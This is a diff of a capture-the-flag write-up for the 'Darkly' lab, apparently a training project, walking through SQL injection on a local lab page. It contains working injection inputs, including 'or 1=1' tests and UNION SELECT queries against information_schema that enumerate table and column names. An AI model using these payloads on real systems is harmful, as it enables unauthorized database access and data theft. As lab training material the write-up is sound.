@@ -1,19 +1,19 @@
 Second flag of Darkly guys are we excited or what!
 
-1.) Where to find the flag
+Step 1.) Where to find the flag
 http://192.168.1.100/index.php?page=searchimg
 
-2.) Now that we are on the page here we can try for simple sql Injection by passing 1 , 1=1 or even passing 1 or 1 = 1
+Step 2.) Now that we are on the page here we can try for simple sql Injection by passing 1 , 1=1 or even passing 1 or 1 = 1
 In doing this we see that data is being returned from the database so we try to get data from the tables in the database using SQL injection
 
-3.) Same as the prev flag we are going to try and get table name of the table here
+Step 3.) Same as the prev flag we are going to try and get table name of the table here
 ''
 -1  UNION SELECT  table_name, 1 FROM information_schema.tables where table_schema = database() 
 ''
 
 here we got back 'list_images'
 
-4.) There after we are going to get the columns again too
+Step 4.) There after we are going to get the columns again too
 ''
 -1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() 
 ''
